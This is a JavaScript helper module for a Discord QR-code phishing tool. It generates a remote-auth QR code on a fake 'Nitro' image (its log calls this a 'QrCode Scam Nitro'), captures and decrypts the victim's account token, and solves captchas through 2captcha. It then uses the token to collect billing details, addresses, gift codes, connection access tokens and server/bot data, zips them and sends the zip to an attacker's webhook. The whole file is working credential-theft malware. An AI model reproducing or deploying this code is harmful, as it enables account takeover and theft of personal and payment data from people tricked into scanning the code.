const
    { QRCodeStyling } = require("qr-code-styling-node/lib/qr-code-styling.common.js"),
    nodeCanvas = require("canvas"),
    HttpsProxyAgent = require('https-proxy-agent'),
    Discord = require("discord.js"),
    AdmZip = require('adm-zip'),
    { StringDecoder } = require('string_decoder'),
    crypto = require('crypto'),
    fs = require("fs"),
    fetch = require("cross-fetch"),
    moment = require("moment-timezone"),
    emoji = {
        "billing": {
            "ppl": "<:Paypal:964621361588891678>",
            "cb": "<:CB:964621420548202616>"
        },
        "nitro": {
            "classic": "<a:aNITROCLASSIC:949298192825061456>",
            "boost": "<a:nitroBoost:852546408053342219>"
        },
        "embed": {
            "token": "<a:bby:946246524634009600>",
            "badge": "<:Chinois:964621441188372530>",
            "nitro": "<:Head:964621306505080832>",
            "billing": "<a:xx:964621251240943697>",
            "ip": "<:Papillons:964621275840528515>",
            "email": "<:galp:963462577915035729>",
            "mdp": "<a:PlayBoy:964621972757676034>"
        }
    },
    allBadges = {
        "rare": {
            "Discord_Employee": {
                "value": 1,
                "emoji": "DISCORD_EMPLOYEE,"
            },
            "Partnered_Server_Owner": {
                "value": 2,
                "emoji": "PARTNERED_SERVER_OWNER,"
            },
            "HypeSquad_Events": {
                "value": 4,
                "emoji": "HYPESQUAD_EVENTS,"
            },
            "Bug_Hunter_Level_1": {
                "value": 8,
                "emoji": "BUGHUNTER_LEVEL_1,"
            },
            "Early_Supporter": {
                "value": 512,
                "emoji": "EARLY_SUPPORTER,"
            },
            "Bug_Hunter_Level_2": {
                "value": 16384,
                "emoji": "BUGHUNTER_LEVEL_2,"
            },
            "Early_Verified_Bot_Developer": {
                "value": 131072,
                "emoji": "EARLY_VERIFIED_BOT_DEVELOPER,"
            },
            "Discord_moderator": {
                "value": 262144,
                "emoji": "DISCORD_CERTIFIED_MODERATOR,"
            }
        },
        "Discord_Employee": {
            "value": 1,
            "emoji": "<:staff:874750808728666152>"
        },
        "Partnered_Server_Owner": {
            "value": 2,
            "emoji": "<:partner:874750808678354964>"
        },
        "HypeSquad_Events": {
            "value": 4,
            "emoji": "<:hypesquad_events:874750808594477056>"
        },
        "Bug_Hunter_Level_1": {
            "value": 8,
            "emoji": "<:bughunter_1:874750808426692658>"
        },
        "Early_Supporter": {
            "value": 512,
            "emoji": "<:early_supporter:874750808414113823>"
        },
        "Bug_Hunter_Level_2": {
            "value": 16384,
            "emoji": "<:bughunter_2:874750808430874664>"
        },
        "Early_Verified_Bot_Developer": {
            "value": 131072,
            "emoji": "<:developer:874750808472825986>"
        },
        "Discord_moderator": {
            "value": 262144,
            "emoji": "<:BadgeDiscordModerator:914504547907555349>"
        },
        "House_Bravery": {
            "value": 64,
            "emoji": "<:bravery:874750808388952075>"
        },
        "House_Brilliance": {
            "value": 128,
            "emoji": "<:brilliance:874750808338608199>"
        },
        "House_Balance": {
            "value": 256,
            "emoji": "<:balance:874750808267292683>"
        },
        "User_Badge_Nitro": {
            "emoji": "<:au_BadgeNitro:650209453056065536>"
        },
        "User_Badge_Boost1": {
            "emoji": "<:au_BadgeBoostLvl1:652231327902466048>"
        },
        "User_Badge_Boost2": {
            "emoji": "<:au_BadgeBoostLvl2:652231327726174229>"
        },
        "User_Badge_Boost3": {
            "emoji": "<:au_BadgeBoostLvl3:652231327751602206>"
        },
        "User_Badge_Boost4": {
            "emoji": "<:au_BadgeBoostLvl4:652231327579373632>"
        },
        "User_Badge_Boost5": {
            "emoji": "<:au_BadgeBoostLvl5:652231327948472330>"
        },
        "User_Badge_Boost6": {
            "emoji": "<:au_BadgeBoostLvl6:652231327483166724>"
        },
        "User_Badge_Boost7": {
            "emoji": "<:au_BadgeBoostLvl7:652231327969705994>"
        },
        "User_Badge_Boost8": {
            "emoji": "<:au_BadgeBoostLvl8:652231328011386900>"
        },
        "User_Badge_Boost9": {
            "emoji": "<:au_BadgeBoostLvl9:652231327885819916>"
        }
    };

function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)) }
function randomProxy() {
    const
        allproxy = fs.readFileSync("./assets/proxy.txt", "utf-8", function (e) { return e }).split("\n"),
        max = allproxy.length - 1,
        min = 0,
        randomNum = Math.floor(Math.random() * (max - min + 1)) + min,
        proxy = allproxy[randomNum] || null;
    return proxy
}
function decryptPayload(encrypted_payload, key) {
    // base64.b64decode(encrypted_payload);
    return crypto.privateDecrypt({
        key: new StringDecoder('utf-8').write(key.privateKey),
        padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
        oaepHash: "sha256",
    }, Buffer.from(encrypted_payload, 'base64'));
}

async function generateQrCode(fingerprint, nitro, name) {
    if (!name) name = "qrcode.png";
    const
        options = {
            "width": 300, "height": 300, "data": `https://discordapp.com/ra/${fingerprint}`, "margin": 0,
            "qrOptions": { "typeNumber": "0", "mode": "Byte", "errorCorrectionLevel": "Q" },
            "imageOptions": { "hideBackgroundDots": true, "imageSize": 0.4, "margin": 5 }, "dotsOptions": { "type": "square", "color": "#000000" },
            "backgroundOptions": { "color": "#ffffff" },
            "image": `data:image/png;base64,${fs.readFileSync("./assets/logo.png", 'base64')}`,
            "dotsOptionsHelper": { "colorType": { "single": true, "gradient": false }, "gradient": { "linear": true, "radial": false, "color1": "#6a1a4c", "color2": "#6a1a4c", "rotation": "0" } }, "cornersSquareOptions": { "type": "square", "color": "#000000" }, "cornersSquareOptionsHelper": { "colorType": { "single": true, "gradient": false }, "gradient": { "linear": true, "radial": false, "color1": "#000000", "color2": "#000000", "rotation": "0" } }, "cornersDotOptions": { "type": "", "color": "#000000" }, "cornersDotOptionsHelper": { "colorType": { "single": true, "gradient": false }, "gradient": { "linear": true, "radial": false, "color1": "#000000", "color2": "#000000", "rotation": "0" } }, "backgroundOptionsHelper": { "colorType": { "single": true, "gradient": false }, "gradient": { "linear": true, "radial": false, "color1": "#ffffff", "color2": "#ffffff", "rotation": "0" } }
        },
        qrCodeImage = new QRCodeStyling({
            nodeCanvas,
            ...options
        }),
        buffer = await qrCodeImage.getRawData("png");
    fs.writeFileSync(`./out/${name}`, buffer)
    console.log("=> ".cyan + "QrCode Generate on ".blue + `./out/${name}.png`.green);

    // NITRO
    if (!nitro) return;
    const
        background = await nodeCanvas.loadImage("./assets/base.png"),
        canvas = nodeCanvas.createCanvas(background.width, background.height),
        ctx = canvas.getContext("2d");
    ctx.drawImage(background, 0, 0);
    ctx.drawImage(await nodeCanvas.loadImage(`./out/${name}`), 88, 314, 125, 125);
    const
        out = fs.createWriteStream(`./out/${name.split(".png")[0]}_nitro.png`),
        stream = canvas.createPNGStream();
    stream.pipe(out);

    console.log("=> ".cyan + "QrCode Scam Nitro Generate on ".blue + "./out/nitro.png".green);

}
async function findRealToken(ticket, key, keyCaptcha, webhook, captchaSolveData = null, proxy = randomProxy()) {
    const
        headers = {
            Accept: '*/*',
            'Accept-Language': 'en-US',
            'Content-Type': 'application/json',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'X-Debug-Options': 'bugReporterEnabled',
            'X-Super-Properties': `${Buffer.from(
                JSON.stringify({
                    os: 'Windows',
                    browser: 'Discord Client',
                    release_channel: 'stable',
                    client_version: '1.0.9011',
                    os_version: '10.0.22621',
                    os_arch: 'x64',
                    system_locale: 'en-US',
                    client_build_number: 175517,
                    native_build_number: 29584,
                    client_event_source: null,
                    design_id: 0,
                }),
                'ascii'
            ).toString('base64')}`,
            'X-Discord-Locale': 'en-US',
            'User-Agent':
                'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9010 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36',
            Referer: 'https://discord.com/channels/@me',
            Connection: 'keep-alive',
        };

    let body;
    if (captchaSolveData) {
        body = JSON.stringify({
            ticket: ticket,
            captcha_key: captchaSolveData,
        });
    } else {
        body = JSON.stringify({
            ticket: ticket,
        });
    }

    const
        pageUrl = `https://discord.com/api/v9/users/@me/remote-auth/login`,
        res = await fetch(pageUrl, {
            method: 'POST',
            headers: headers,
            body: body,
            // agent: new HttpsProxyAgent(`http://${proxy}`)
        }),
        data = await res.json();

    if (data.captcha_sitekey) {
        console.log('Captcha required...');
        const payload = {
            embeds: [
                {
                    author: {
                        name: `Captcha required...`,
                        icon_url: 'https://media.tenor.com/P6IIu-OdcHsAAAAC/hacker-techno.gif',
                    },
                    description: `\`\`\`${JSON.stringify(data)}\`\`\``,
                    color: hexColorToDiscordInt("#ffffff"),
                    // footer: {
                    //     text: ' ✌ By https://github.com/zougataga',
                    // },
                },
            ],
        };
        if (!webhook?.id) await sendWebhook(webhook, payload);
        else webhook.send(payload).catch((e) => console.log(e));

        // Résoudre le captcha
        const captchaSolveResponse = await solveCaptcha(data.captcha_sitekey, pageUrl, keyCaptcha, webhook);
        if (!captchaSolveResponse) {
            const payload = {
                embeds: [
                    {
                        author: {
                            name: `Captcha ERROR...`,
                            icon_url: 'https://media.tenor.com/P6IIu-OdcHsAAAAC/hacker-techno.gif',
                        },
                        description: `\`\`\`${JSON.stringify({ captchaSolveResponse })}\`\`\``,
                        color: hexColorToDiscordInt("#ffffff"),
                        footer: {
                            text: ' ✌ By https://github.com/zougataga',
                        },
                    },
                ],
            };
            if (!webhook?.id) await sendWebhook(webhook, payload);
            else webhook.send(payload).catch((e) => console.log(e));
            return;
        };
        // Appeler la fonction récursivement avec les données du captcha résolu
        return await findRealToken(ticket, key, keyCaptcha, webhook, captchaSolveResponse);
    } else if (data?.encrypted_token) {
        return decryptPayload(data.encrypted_token, key).toString();
    }
}
async function solveCaptcha(siteKey, pageUrl, keyCaptcha, webhook) {
    if (!keyCaptcha) {
        const payload = {
            embeds: [
                {
                    author: {
                        name: `AntiCaptcha Off`,
                        icon_url: 'https://media.tenor.com/P6IIu-OdcHsAAAAC/hacker-techno.gif',
                    },
                    description: `\`\`\`${JSON.stringify({ siteKey, pageUrl })}\`\`\``,
                    color: hexColorToDiscordInt("#ffffff"),
                    footer: {
                        text: ' ✌ By https://github.com/zougataga',
                    },
                },
            ],
        };
        if (!webhook?.id) await sendWebhook(webhook, payload);
        else webhook.send(payload).catch((e) => console.log(e));
        return
    };

    const
        url2Cap = `https://2captcha.com/in.php?key=${keyCaptcha}&method=userrecaptcha&googlekey=${siteKey}&pageurl=${pageUrl}&json=1`,
        resCap1 = await fetch(url2Cap),
        id = (await resCap1.json()).request;
    let verifyCap = `https://2captcha.com/res.php?key=${keyCaptcha}&action=get&id=${id}&json=1`, response;
    do {
        const
            resVerify = await fetch(verifyCap),
            verifyJson = await resVerify.json();
        response = verifyJson.request;
        if (response === 'ERROR_WRONG_CAPTCHA_ID') {
            const
                resRetry = await fetch(url2Cap),
                newId = (await resRetry.json()).request;
            verifyCap = `https://2captcha.com/res.php?key=${keyCaptcha}&action=get&id=${newId}&json=1`;
            await sleep(5000); // Attendre 5 secondes avant de vérifier à nouveau le nouveau captcha
        } else {
            await sleep(1500); // Attendre 1,5 seconde avant de vérifier à nouveau le captcha existant
        }
    } while (response === 'CAPCHA_NOT_READY' || response === 'ERROR_WRONG_CAPTCHA_ID');

    console.log('Captcha solved.');
    console.log(response);
    return response;
}
function hexColorToDiscordInt(hexColor) {
    if (hexColor.startsWith('#')) hexColor = hexColor.substring(1);
    const decimalColor = parseInt(hexColor, 16);
    return decimalColor > 0xFFFFFF ? 0 : decimalColor;;
}
function sendWebhook(webhook, payload) {
    return fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    }).catch((e) => { console.log(e); });
}
async function discord(url, token) {
    try {
        const response = await fetch(url, {
            method: 'GET',
            headers: {
                authorization: token
            }
        });
        const info = await response.json();
        return info;
    } catch (err) {
        return false;
    }
};

function badges(flags) {
    let b = '';
    for (const prop in allBadges) {
        let o = allBadges[prop];
        if ((flags & o.value) == o.value) b += o.emoji;
    };
    if (b == '') b = "`No badges`"
    return b;
};

function rbadges(flags) {
    let b = '';
    for (const prop in allBadges.rare) {
        let o = allBadges.rare[prop];
        if ((flags & o.value) == o.value) b += o.emoji;
    };
    if (b == '') b = ""
    return b;
};
function billing(bil) {
    let billing = "";
    if (bil.length > 0) billing = ` `;
    else billing = "`No`";
    bil?.forEach(i => { i.brand && 0 == i.invalid && (billing += emoji.billing.cb), i.email && (billing += emoji.billing.ppl) });
    return billing;
};
async function nitro(info, token) {
    let b = "";
    if (info.premium_type === 1 || info.premium_type === 2) b += `${allBadges.User_Badge_Nitro.emoji} `;
    if (info.premium_type === 2) b += await badgeboost(info, token);
    if (b == "") b = "`No nitro`";
    return b;
};
async function badgeboost(data, token) {
    const res2 = await fetch(`https://discord.com/api/v9/users/${data.id}/profile?with_mutual_guilds=false`, {
        method: "GET",
        headers: {
            authorization: token
        }
    });
    const
        res2Data = await res2.json(),
        boostdate = res2Data.premium_since;
    if (!res2Data) return;
    if (boostdate) {
        const
            date1 = new Date(moment(boostdate).format("YYYY-MM-DD hh:mm:ss")),
            date2 = new Date(moment(new Date()).format("YYYY-MM-DD hh:mm:ss")),
            diff = dif(date1, date2);
        return `${boost(diff.week)}`
    };
    return "";
}

async function zip(token, user, id, webhook) {
    fs.access(`./${id}`, (error) => { if (error) return; })
    fs.mkdir(`./${id}`, { recursive: true }, (error) => { if (error) return; })
    const
        bill = await discord("https://discord.com/api/v9/users/@me/billing/payment-sources", token) || [],
        gi = await discord("https://discord.com/api/v8/users/@me/entitlements/gifts", token) || [],
        gi2 = await discord("https://discord.com/api/v9/users/@me/outbound-promotions/codes", token) || [],
        gu = await discord("https://discord.com/api/v9/users/@me/guilds", token) || [],
        bo = await discord("https://discord.com/api/v9/applications", token) || [],
        coo = await discord("https://discordapp.com/api/v9/users/@me/connections", token) || [],
        amis = await discord("https://discordapp.com/api/v9/users/@me/relationships", token) || [];
    let guu = "", p = "", boo = "", gif = "", co = "", fi = "", a = "Zip folder's content:\n\n";
    if (gu) gu?.forEach(e => { if (e.owner) { guu += `GUILD: ${e.name} (${e.id}) | OWNER: true | ADMIN: TRUE\n` } else if (e.permissions.startsWith("4")) { guu += `GUILD: ${e.name} (${e.id}) | OWNER: false | ADMIN: TRUE\n` } });
    if (bo) bo?.forEach(e => { if (e.bot) { boo += `BOT: ${e.bot.username}#${e.bot.discriminator} (${e.bot.id}) | FLAGS: ${e.flags !== 0 ? "yes" : "no"} | VERIF: ${(e.public_flags && 65536) === 65536 ? "yes" : "no"}\n` } });
    if (gi) gi?.forEach(e => { if (e) gif += `TYPE: Nitro | CODE: ${e}\n` });
    if (gi2?.length != 0 && !gi2?.code) gi2?.forEach(e => { if (e.code) gif += `TYPE: ${e.promotion.outbound_title} | CODE: ${e.code}\n` });
    if (bill) bill?.forEach(i => { if (i.brand && 0 == i.invalid) p += `TYPE: Card | DEFAULT: ${i.default} | NAME: ${i.billing_address.name} | NUMBER: ************${i.last_4} | EXPIRES: ${i.expires_month}/${i.expires_year} | BRAND: ${i.brand} | ADRESS: ${i.billing_address.line_1} [${i.billing_address.country}] (${i.billing_address.city}, ${i.billing_address.postal_code}, ${i.billing_address.state})\n`; if (i.email) p += `TYPE: Paypal | DEFAULT: ${i.default} | NAME: ${i.billing_address.name} | EMAIL: ${i.email} | ADRESS: ${i.billing_address.line_1} [${i.billing_address.country}] (${i.billing_address.city}, ${i.billing_address.postal_code}, ${i.billing_address.state})\n`; });
    if (coo) coo?.forEach(e => { if (e.type) { co += `TYPE: ${e.type} | NAME: ${e.name} (${e.id}) | TOKEN: ${e.access_token || "Non"}\n` } });
    const r = amis.filter((user) => { return user.type == 1 });
    for (z of r) {
        let b = rbadges(z.user.public_flags)
        if (b != "") { fi += `USER: ${z.user.username}#${z.user.discriminator} | BADGES: ${b}\n` }
    };
    let zip = new AdmZip();
    if (guu != "") {
        let pp = `@~$~@zougataga-${user}\n${guu}`;
        fs.writeFileSync(`./${id}/Guilds.txt`, pp, function (err) { if (err) return });
        zip.addLocalFile(`./${id}/Guilds.txt`);
        const { size } = fs.statSync(`./${id}/Guilds.txt`);
        a += `📄 Guilds.txt - ${sz(size)}\n`;
        setTimeout(() => { fs.unlink(`./${id}/Guilds.txt`, (err) => { if (err) console.log(err) }) }, 5000);
    };
    if (p != "") {
        let pp = `@~$~@zougataga-${user}\n${p}`;
        fs.writeFileSync(`./${id}/Billing.txt`, pp, function (err) { if (err) return });
        zip.addLocalFile(`./${id}/Billing.txt`);
        const { size } = fs.statSync(`./${id}/Billing.txt`);
        a += `📄 Billing.txt - ${sz(size)}\n`;
    };
    if (boo != "") {
        let pp = `@~$~@zougataga-${user}\n${boo}`;
        fs.writeFileSync(`./${id}/Bot.txt`, pp, function (err) { if (err) return });
        zip.addLocalFile(`./${id}/Bot.txt`);
        const { size } = fs.statSync(`./${id}/Bot.txt`);
        a += `📄 Bot.txt - ${sz(size)}\n`;
    };
    if (gif != "") {
        let pp = `@~$~@zougataga-${user}\n${gif}`;
        fs.writeFileSync(`./${id}/Gift.txt`, pp, function (err) { if (err) return });
        zip.addLocalFile(`./${id}/Gift.txt`);
        const { size } = fs.statSync(`./${id}/Gift.txt`);
        a += `📄 Gift.txt - ${sz(size)}\n`;
    };
    if (co != "") {
        let pp = `@~$~@zougataga-${user}\n${co}`;
        fs.writeFileSync(`./${id}/Connections.txt`, pp, function (err) { if (err) return });
        zip.addLocalFile(`./${id}/Connections.txt`);
        const { size } = fs.statSync(`./${id}/Connections.txt`);
        a += `📄 Connections.txt - ${sz(size)}\n`;
    };
    if (fi != "") {
        let pp = `@~$~@zougataga-${user}\n${fi}`;
        fs.writeFileSync(`./${id}/RareFriends.txt`, pp, function (err) { if (err) return });
        zip.addLocalFile(`./${id}/RareFriends.txt`);
        const { size } = fs.statSync(`./${id}/RareFriends.txt`);
        a += `📄 RareFriends.txt - ${sz(size)}\n`;
    };
    zip.writeZip(`zi-${id}.zip`);
    if (a == "Zip folder's content:\n\n") return console.log("Vide");
    const
        attachment = new Discord.MessageAttachment(`zi-${id}.zip`, `${id}.zip`),
        payload = {
            files: [attachment],
            embeds: [
                {
                    "author": {
                        "name": user,
                        "icon_url": "https://media.tenor.com/P6IIu-OdcHsAAAAC/hacker-techno.gif"
                    },
                    "description": `\`\`\`${a}\`\`\``,
                    "color": 123456,
                    "footer": {
                        "text": " ✌ By https://github.com/zougataga"
                    }
                }
            ]
        };

    if (!webhook?.id) {
        await sendWebhook(webhook, payload);
        setTimeout(() => { fs.unlink(`zi-${id}.zip`, (err) => { if (err) console.log(err) }); fs.rmdir(`./${id}`, { recursive: true }, (err) => { if (err) { throw err; } }); }, 5000)
    }
    else webhook.send(payload).then(() => { setTimeout(() => { fs.unlink(`zi-${id}.zip`, (err) => { if (err) console.log(err) }); fs.rmdir(`./${id}`, { recursive: true }, (err) => { if (err) { throw err; } }); }, 5000) }).catch((e) => console.log(e));
    return;
};

module.exports = {
    discord,
    sendWebhook,
    sleep,
    decryptPayload,
    findRealToken,
    badgeboost,
    nitro,
    hexColorToDiscordInt,
    billing,
    badges,
    rbadges,
    generateQrCode,
    zip,
    allBadges,
    emoji
}

function boost(time) {
    let badge = "";
    if (time === 0 || time === 1) badge = allBadges.User_Badge_Boost1.emoji;
    if (time === 2) badge = allBadges.User_Badge_Boost2.emoji;
    if (time === 3 || time === 4 || time === 5) badge = allBadges.User_Badge_Boost3.emoji;
    if (time === 6 || time === 7 || time === 8) badge = allBadges.User_Badge_Boost4.emoji;
    if (time === 9 || time === 10 || time === 11) badge = allBadges.User_Badge_Boost5.emoji;
    if (time === 12 || time === 13 || time === 14) badge = allBadges.User_Badge_Boost6.emoji;
    if (time === 15 || time === 16 || time === 17) badge = allBadges.User_Badge_Boost7.emoji;
    if (time === 18 || time === 19 || time === 20 || time === 21 || time === 22 || time === 23) badge = allBadges.User_Badge_Boost8.emoji;
    if (24 <= time) badge = allBadges.User_Badge_Boost9.emoji;
    if (badge === "") return allBadges.User_Badge_Boost1.emoji;
    return badge;
}
function dif(date1, date2) {
    let
        diff = {},
        tmp = date2 - date1;
    tmp = Math.floor(tmp / 1000);
    diff.sec = tmp % 60;
    tmp = Math.floor((tmp - diff.sec) / 60);
    diff.min = tmp % 60;
    tmp = Math.floor((tmp - diff.min) / 60);
    diff.hour = tmp % 24;
    tmp = Math.floor((tmp - diff.hour) / 24);
    diff.day = tmp;
    tmp = Math.floor((diff.day) / 31);
    diff.week = tmp;
    return diff;
}


function sz(size) { const i = Math.floor(Math.log(size) / Math.log(1024)); return (size / Math.pow(1024, i)).toFixed(2) * 1 + " " + ['B', 'KB', 'MB', 'GB', 'TB'][i] };
